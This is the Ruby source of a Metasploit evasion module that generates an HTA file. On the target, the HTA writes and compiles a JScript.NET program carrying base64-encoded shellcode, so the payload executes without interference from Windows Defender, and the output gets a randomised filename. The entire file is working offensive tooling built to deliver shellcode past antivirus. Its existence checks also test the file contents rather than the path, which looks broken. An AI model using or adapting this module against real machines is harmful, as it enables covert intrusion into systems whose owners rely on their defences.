##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Evasion

  def initialize(info={})
    super(merge_info(info,
      'Name'        =>  'Microsoft Windows Defender Evasive HTA',
      'Description' =>  %q{
        This module will generate an HTA file that writes and compiles a JScript.NET file
        containing shellcode on the target machine. After compilation, the generated EXE will
        execute the shellcode without interference from Windows Defender.
      },
      'Author'      =>
        [
          'sinmygit',    # PoC
          'Shelby Pace'  # Metasploit Module
        ],
      'License'     =>  MSF_LICENSE,
      'Platform'    =>  'win',
      'Arch'        =>  ARCH_X64,
      'Targets'     =>  [ [ 'Microsoft Windows', {} ] ]
    ))

    register_options([
      OptString.new(
        'FILENAME',
          [
            true,
            'Filename for the evasive file (default: random)',
            "#{Rex::Text.rand_text_alpha(3..10)}.hta"
          ])
    ], self.class)
  end

  def run
    # This is used in the ERB template
    file_payload = Rex::Text.encode_base64(payload.encoded)

    jsnet_code = File.read(File.join(Msf::Config.data_directory, 'exploits', 'evasion_shellcode.js'))
    fail_with(Failure::NotFound, 'The JScript.NET file was not found.') unless File.exists?(jsnet_code)
    js_file = ERB.new(jsnet_code).result(binding())
    jsnet_encoded = Rex::Text.encode_base64(js_file)

    # This is used in the ERB template
    fname = Rex::Text.rand_text_alpha(6)

    hta = File.read(File.join(Msf::Config.data_directory, 'exploits', 'hta_evasion.hta'))
    fail_with(Failure::NotFound, 'The HTA file was not found.') unless File.exists?(hta)
    hta_file = ERB.new(hta).result(binding())

    file_create(hta_file)
  end
end
